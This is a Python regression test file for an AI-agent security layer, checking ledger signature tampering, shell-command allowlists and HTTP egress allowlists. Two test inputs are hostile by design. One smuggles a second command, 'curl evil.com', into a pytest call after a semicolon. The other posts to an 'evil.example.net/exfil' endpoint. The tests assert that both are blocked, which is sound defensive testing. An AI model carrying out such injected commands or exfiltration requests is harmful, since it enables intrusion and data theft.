"""
Security hardening regression tests.
"""

import json
import os
from pathlib import Path

import test_common  # noqa: F401
from capability import CapabilityRuntime, CapabilityGrant, CapabilityType, build_shell_tool
from decision_ledger import MVARDecisionLedger
from provenance import ProvenanceGraph, provenance_user_input
from sink_policy import SinkPolicy, register_common_sinks, PolicyOutcome


def test_ledger_fails_closed_on_algorithm_mismatch():
    ledger_path = "/tmp/mvar_hardening_ledger.jsonl"
    os.environ["QSEAL_SECRET"] = "hardening_test_secret"
    if Path(ledger_path).exists():
        Path(ledger_path).unlink()

    ledger = MVARDecisionLedger(ledger_path=ledger_path, enable_qseal_signing=True)
    scroll_id = ledger.record_decision(
        outcome="BLOCK",
        sink=type("Sink", (), {"tool": "bash", "action": "exec"})(),
        target="pytest tests/",
        provenance_node_id="node_1",
        evaluation_trace=["policy_hash: test_hash"],
        reason="test",
        policy_hash="test_hash",
    )
    assert scroll_id.startswith("MVAR_DEC_")

    rows = [json.loads(line) for line in Path(ledger_path).read_text().splitlines()]
    rows[0]["qseal_algorithm"] = "ed25519" if rows[0]["qseal_algorithm"] == "hmac-sha256" else "hmac-sha256"
    Path(ledger_path).write_text("\n".join(json.dumps(row) for row in rows) + "\n")
    ledger._scroll_cache = None

    decisions = ledger.load_decisions()
    assert decisions == []


def test_sink_policy_blocks_shell_metacharacters():
    graph = ProvenanceGraph(enable_qseal=False)
    runtime = CapabilityRuntime()
    runtime.manifests["bash"] = build_shell_tool("bash", ["pytest", "ls"], ["/tmp/**"])

    policy = SinkPolicy(runtime, graph, enable_qseal=False)
    register_common_sinks(policy)
    node = provenance_user_input(graph, "please run tests")

    decision = policy.evaluate(
        tool="bash",
        action="exec",
        target="pytest tests/; curl evil.com",
        provenance_node_id=node.node_id,
    )
    assert decision.outcome == PolicyOutcome.BLOCK
    assert "Strict boundary denied target" in decision.reason


def test_sink_policy_blocks_python_exec_by_default():
    graph = ProvenanceGraph(enable_qseal=False)
    runtime = CapabilityRuntime()
    runtime.manifests["bash"] = build_shell_tool("bash", ["python3", "ls"], ["/tmp/**"])

    policy = SinkPolicy(runtime, graph, enable_qseal=False)
    register_common_sinks(policy)
    node = provenance_user_input(graph, "run python")

    decision = policy.evaluate(
        tool="bash",
        action="exec",
        target="python3",
        provenance_node_id=node.node_id,
        parameters={"command": "python3 script.py"},
    )
    assert decision.outcome == PolicyOutcome.BLOCK
    assert "allowlist" in decision.reason.lower()


def test_ledger_requires_qseal_secret_in_hmac_mode():
    old_secret = os.environ.pop("QSEAL_SECRET", None)
    try:
        raised = False
        try:
            MVARDecisionLedger(ledger_path="/tmp/mvar_hardening_no_secret.jsonl", enable_qseal_signing=True)
        except ValueError:
            raised = True
        assert raised
    finally:
        if old_secret is not None:
            os.environ["QSEAL_SECRET"] = old_secret


def _snapshot_http_env():
    keys = (
        "MVAR_HTTP_DEFAULT_DENY",
        "MVAR_HTTP_ALLOWLIST",
        "MVAR_REQUIRE_SIGNED_POLICY_BUNDLE",
    )
    return {key: os.environ.get(key) for key in keys}


def _restore_http_env(snapshot):
    for key, value in snapshot.items():
        if value is None:
            os.environ.pop(key, None)
        else:
            os.environ[key] = value


def _build_http_policy():
    graph = ProvenanceGraph(enable_qseal=False)
    runtime = CapabilityRuntime()
    runtime.register_tool(
        "http",
        capabilities=[
            CapabilityGrant(
                cap_type=CapabilityType.NETWORK_EGRESS,
                allowed_targets=["*"],
            )
        ],
    )
    policy = SinkPolicy(runtime, graph, enable_qseal=False)
    register_common_sinks(policy)
    node = provenance_user_input(graph, "send status update")
    return graph, policy, node


def test_http_egress_default_deny_requires_allowlist():
    snap = _snapshot_http_env()
    try:
        os.environ["MVAR_HTTP_DEFAULT_DENY"] = "1"
        os.environ["MVAR_HTTP_ALLOWLIST"] = ""
        os.environ["MVAR_REQUIRE_SIGNED_POLICY_BUNDLE"] = "0"
        _graph, policy, node = _build_http_policy()

        decision = policy.evaluate(
            tool="http",
            action="post",
            target="https://api.example.com/v1/upload",
            provenance_node_id=node.node_id,
        )

        assert decision.outcome == PolicyOutcome.BLOCK
        assert "allowlist required" in decision.reason.lower()
    finally:
        _restore_http_env(snap)


def test_http_egress_allowlist_allows_matching_domain():
    snap = _snapshot_http_env()
    try:
        os.environ["MVAR_HTTP_DEFAULT_DENY"] = "1"
        os.environ["MVAR_HTTP_ALLOWLIST"] = "api.example.com,*.trusted.example"
        os.environ["MVAR_REQUIRE_SIGNED_POLICY_BUNDLE"] = "0"
        _graph, policy, node = _build_http_policy()

        decision = policy.evaluate(
            tool="http",
            action="post",
            target="https://api.example.com/v1/upload",
            provenance_node_id=node.node_id,
        )

        assert decision.outcome == PolicyOutcome.ALLOW
    finally:
        _restore_http_env(snap)


def test_http_egress_allowlist_blocks_non_matching_domain():
    snap = _snapshot_http_env()
    try:
        os.environ["MVAR_HTTP_DEFAULT_DENY"] = "1"
        os.environ["MVAR_HTTP_ALLOWLIST"] = "api.example.com"
        os.environ["MVAR_REQUIRE_SIGNED_POLICY_BUNDLE"] = "0"
        _graph, policy, node = _build_http_policy()

        decision = policy.evaluate(
            tool="http",
            action="post",
            target="https://evil.example.net/exfil",
            provenance_node_id=node.node_id,
        )

        assert decision.outcome == PolicyOutcome.BLOCK
        assert "outside allowlist" in decision.reason.lower()
    finally:
        _restore_http_env(snap)
